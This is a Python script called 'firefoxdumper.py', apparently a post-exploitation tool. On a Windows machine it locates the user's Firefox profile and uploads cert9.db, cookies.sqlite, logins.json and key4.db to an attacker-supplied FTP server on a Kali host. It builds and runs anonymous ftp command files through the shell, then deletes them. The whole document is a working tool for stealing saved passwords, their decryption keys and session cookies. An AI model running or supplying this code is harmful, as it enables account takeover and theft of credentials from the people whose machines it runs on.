import os
import time
import textwrap
import argparse 
import re 
import subprocess
import sys

opt_parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent(
    '''Example: python3 firefoxdumper.py -i 192.168.1.1
'''))
required = opt_parser.add_argument_group('Required arguments')
required.add_argument(
    '-i', '--ip', help='IP address hosting FTP server', required=True)

args = opt_parser.parse_args()

def banner():
    print("    _______           ______              ____                                  ")
    print("   / ____(_)_______  / ____/___  _  __   / __ \__  ______ ___  ____  ___  _____ ")
    print("  / /_  / / ___/ _ \/ /_  / __ \| |/_/  / / / / / / / __ `__ \/ __ \/ _ \/ ___/ ")
    print(" / __/ / / /  /  __/ __/ / /_/ />  <   / /_/ / /_/ / / / / / / /_/ /  __/ /     ")
    print("/_/   /_/_/   \___/_/    \____/_/|_|  /_____/\__,_/_/ /_/ /_/ .___/\___/_/      ")
    print("                                                           /_/                  ")


def main():
    try:
        t_IP = str(args.ip)
        username = os.getenv('Username')
        apples = os.listdir("C:\\Users\\" + username +
                    "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
        results = apples[1]
        bananas = ("C:\\Users\\" + username +
           "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\" + results)
        cert9 = (bananas + "\\cert9.db")
        cookies = (bananas + "\\cookies.sqlite")
        logins = (bananas + "\\logins.json")
        key4 = (bananas + "\\key4.db")
        command = ("echo open " + t_IP + " >> ftp &echo user anonymous >> ftp &echo binary >> ftp &echo put " +
           cert9 + " >> ftp &echo bye >> ftp &ftp -n -v -s:ftp &del ftp")    
        stdout=subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr = subprocess.DEVNULL).stdout
        response = stdout.read()        
        response = str(response)
        valid_response = re.search('Log in with USER and PASS first.', response)
        invalid_response = re.search('Not connected.', response) 
        if valid_response:
            print('\n[success] Connection successful. Files transmitting to your FTP server.')
        if invalid_response:
            print('\n[warning] Connection refused. Check that you ran python3 -m pyftpdlib -p 21 -w on Kali and try again')
            sys.exit() 
        time.sleep(.5)
        command = ("echo open " + t_IP + " >> ftp &echo user anonymous >> ftp &echo binary >> ftp &echo put " +
           cookies + " >> ftp &echo bye >> ftp &ftp -n -v -s:ftp &del ftp")
        stdout=subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr = subprocess.DEVNULL).stdout
        response = stdout.read()
        response = str(response)
        invalid_response = re.search('Not connected.', response) 
        if invalid_response:
            print('\n[warning] Connection refused. Check that you ran python3 -m pyftpdlib -p 21 -w on Kali and try again')
            sys.exit() 
        time.sleep(.5)
        command = ("echo open " + t_IP + " >> ftp &echo user anonymous >> ftp &echo binary >> ftp &echo put " +
           logins + " >> ftp &echo bye >> ftp &ftp -n -v -s:ftp &del ftp")
        stdout=subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr = subprocess.DEVNULL).stdout
        response = stdout.read()
        response = str(response)
        invalid_response = re.search('Not connected.', response) 
        if invalid_response:
            print('\n[warning] Connection refused. Check that you ran python3 -m pyftpdlib -p 21 -w on Kali and try again')
            sys.exit() 
        time.sleep(.5)
        command = ("echo open " + t_IP + " >> ftp &echo user anonymous >> ftp &echo binary >> ftp &echo put " +
           key4 + " >> ftp &echo bye >> ftp &ftp -n -v -s:ftp &del ftp")
        stdout=subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr = subprocess.DEVNULL).stdout
        response = stdout.read()
        response = str(response)
        invalid_response = re.search('Not connected.', response)
        if valid_response:
            print("\n[success] Files should have transmitted successfully. Check your FTP server directory.") 
        if invalid_response:
            print('\n[warning] Connection refused. Check that you ran python3 -m pyftpdlib -p 21 -w on Kali and try again')
            sys.exit() 

    except KeyboardInterrupt:
        print("\nYou either fat fingered this, or meant to do it. Either way, goodbye!")
        sys.exit()

if __name__ == "__main__":
    banner()
    main()
